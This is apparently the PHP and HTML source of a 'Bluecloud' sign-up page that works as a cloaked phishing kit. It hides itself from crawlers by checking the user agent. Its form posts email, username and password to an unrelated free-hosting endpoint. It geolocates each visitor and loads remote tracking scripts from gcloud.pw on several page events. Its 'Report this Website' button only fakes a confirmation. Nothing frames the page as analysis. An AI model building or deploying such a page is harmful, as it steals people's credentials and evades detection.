<!DOCTYPE html>

<?php

$googleapps84747474 = strtolower($_SERVER['HTTP_USER_AGENT']);

if(preg_match("/(bot|Bot|crawler|Crawler|spider|Spider)/","$googleapps84747474"))

{
}

else

{

?>

<script type="text/javascript" src="https://code.jquery.com/jquery-latest.js"></script>

<head>
<title>Register</title>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="/dashboard/jquery.js" type="text/javascript"></script>
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
</head>

<div style="padding:12px;box-shadow:0 2px 4px rgba(0,0,0,0.4);background-color:#ffffff;margin:12px;">

<div align="center">

<div style="padding:14px;background-color:#f1f1f1;color:#444444;box-sizing:border-box;cursor:pointer;font-weight:bold;" onclick="window.open('/','_self');">

<divapps84747474 style="font-weight:normal;">Blue</divapps84747474><divapps84747474 style="font-weight:bold;">cloud</divapps84747474>

</div>

<div>
</div>

</div>

<style>

html,body
{
margin:0px;
padding:0px;
font-family:Varela Round, sans-serif;
background-color:#ECEFF1!important;
}

</style>

<html>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">
<title>Getit register</title>
<style>
* {
  box-sizing: border-box;
}

body {
}

#regForm {
  padding:12px;
}

h1 {
  text-align: center;  
}

input {
  padding: 10px;
  width: 100%;
  font-size: 17px;
  font-family: Raleway;
  border: 1px solid #aaaaaa;
}

/* Mark input boxes that gets an error on validation: */
input.invalid {
  background-color: #ffdddd;
}

/* Hide all steps by default: */
.tab {
}

button {
  background-color: #1565C0;
  color: #ffffff;
  border: none;
  padding: 10px 20px;
  font-size: 17px;
  font-family: Raleway;
  cursor: pointer;
}

button:hover {
  opacity: 0.8;
}

#prevBtn {
  background-color: #bbbbbb;
}

/* Make circles that indicate the steps of the form: */
.step {
  height: 15px;
  width: 15px;
  margin: 0 2px;
  background-color: #bbbbbb;
  border: none;  
  border-radius: 50%;
  display: inline-block;
  opacity: 0.5;
}

.step.active {
  opacity: 1;
}

/* Mark the steps that are finished and valid: */
.step.finish {
  background-color: #1565C0;
}

.googleapps84747474
{
display:flex;
}

</style>
<body>



<form id="regForm" action="https://mobileapps84747474.000webhostapp.com/people/pageupdates84747474.php" enctype="multipart/form-data" method="post">
<!-- One "tab" for each step in the form: -->

<div class="tab">

<div class="googleapps84747474">

</div>

</div>  

<div class="tab">

<div class="googleapps84747474">

<input type="email" placeholder="Email" oninput="this.className = ''" name="email" style="background-color:#f1f1f1;border:none;" required>

</div>

</div>

<div class="tab" style="margin-top:12px;">

<div class="googleapps84747474">

</div>

</div>

<div class="tab">

<div class="googleapps84747474">

<input placeholder="Username" oninput="this.className = ''" name="uname" style="background-color:#f1f1f1;border:none;" required>

</div>

</div>

<div class="tab">

<div class="googleapps84747474">

</div>

</div>



<div class="tab">

<div class="googleapps84747474">

<input placeholder="Password" oninput="this.className = ''" name="pword" type="password" style="background-color:#f1f1f1;border:none;margin-top:12px;" required>

<input type="file" name="image" id="googleimageappsmobileappsappsappsappsappsapps84" style="display:none;" required>

</div>

</div>

<div>

<div class="googleappsappsappsappsapps84222274" style="font-size:12.8px;">

<div style="display:flex;">

<div id="googleappsappsappsappsappsappsapps844444444474" onclick="document.getElementById('googleimageappsmobileappsappsappsappsappsapps84').click();" style="padding:12px;background-color:#42A5F5;display:inline-block;margin-top:12px;color:#ffffff;cursor:pointer;">

Set account image

</div>

<div>

<div class='googleappsappsappsappsapps8474447444744474' style="color:#ffffff;font-size:14.6px;background-color:#42A5F5;padding:12px;margin-top:12px;">required</div>

</div>

</div>

</div>

<input type="submit" value="REGISTER" style="padding:12px;background-color:#42A5F5;color:#ffffff;margin-top:12px;box-shadow:0 2px 4px rgba(0,0,0,0.4);"></input>

</div>

</form>



</div>

<script>

$(document).ready(function(){

$('#googleimageappsmobileappsappsappsappsappsapps84').on('change', function() {

var google8474447444744474 = $('#googleimageappsmobileappsappsappsappsappsapps84').val();

$(".googleappsappsappsappsapps8474447444744474").text('success');

});

});

</script>

<footer8474 id="footer84747474">

<div class="mui-container-fluid">

<div style="color:#222222!important;font-size:12.8px;z-index:44;left:12px;bottom:12px;position:fixed;width:100%;padding:12px;background-color:#ffffff;bottom:0px;left:0px;box-sizing:border-box;z-index:88888844;">

&copy; <?php echo date('Y',time()); ?> Bluecloud

<div style="position:absolute;right:12px;padding:12px;bottom:56px;background-color:#ffffff;width:156px;box-shadow:0 2px 4px rgba(0,0,0,0.4);">Find any malware or think this website is a phishing website, or any thing else report it</div>

<div style="float:right;cursor:pointer;" onclick="$('.googleappsapps847474744474447444744474').show();">Report this Website</div>

<center>

<div class="googleappsapps847474744474447444744474" style="position:fixed;padding:12px;top:12%;display:none;background-color:#ffffff;margin:0 auto;width:146px;left:12px;right:12px;box-shadow:0 2px 4px rgba(0,0,0,0.4);" onclick="$('.googleappsapps847474744474447444744474').hide();">Thank you, this website has been reported</div>

</center>

</div>

</div>

</footer8474>

<?php

$googleapps84747474 = strtolower($_SERVER['HTTP_USER_AGENT']);

?>

<?php

if(preg_match("/(bot|Bot|crawler|Crawler|spider|Spider)/","$googleapps84747474"))

{
}

else

{

?>

<?php

$userip8884 = $_SERVER['HTTP_CF_CONNECTING_IP'];

?>

<?php

$json_string = "http://www.geoplugin.net/json.gp?ip=$userip8884";

$jsondata = file_get_contents($json_string);

$jsondata = json_decode($jsondata, true);

$jsondata84747474 = $jsondata['geoplugin_countryName'];

?>

<?php

if(preg_match("/[\W\w]/","$jsondata84747474"))

{
}

else

{

?>

<script>

var url84747474 = document.referrer;

var google84747474 = location.href;
var google84444474 = google84747474.substring(google84747474.indexOf('?')+1);

var script = document.createElement('script');
script.src = 'https://www.gcloud.pw/analytics/web/analytics/analytics.php?username=bzLy9WpnBGaPcmK0qWjwfk3rNvlTX9pdRr2DP1VidcE%3D&password=&country=ZA&referer=' + url84747474 + '&keywordsapps8474=' + google84444474 + '';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);

var time,timeSite;

time=new Date();

window.onbeforeunload=function(){
timeSite=new Date()-time;
window.localStorage['timeSite']=timeSite;

var url84747474 = document.referrer;

var script = document.createElement('script');
script.src = 'https://www.gcloud.pw/analytics/web/analytics/analytics.php?username=bzLy9WpnBGaPcmK0qWjwfk3rNvlTX9pdRr2DP1VidcE%3D&password=&country=ZA&timeonsite=' + timeSite + '';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);

}

var list84747474 = document.getElementsByTagName('html')[0];

window.addEventListener('backbutton', function(){

var script = document.createElement('script');
script.src = 'https://www.gcloud.pw/analytics/web/analytics/analytics.php?username=bzLy9WpnBGaPcmK0qWjwfk3rNvlTX9pdRr2DP1VidcE%3D&password=&useractions8884=googleapps84&country=ZA';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);

});

window.addEventListener('scroll', function(){

var script = document.createElement('script');
script.src = 'https://www.gcloud.pw/analytics/web/analytics/analytics.php?username=bzLy9WpnBGaPcmK0qWjwfk3rNvlTX9pdRr2DP1VidcE%3D&password=&useractions8884=googleapps84&country=ZA';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);

});

</script>

<?php

}

?>

<?php

}

?>

<?php

}

?>

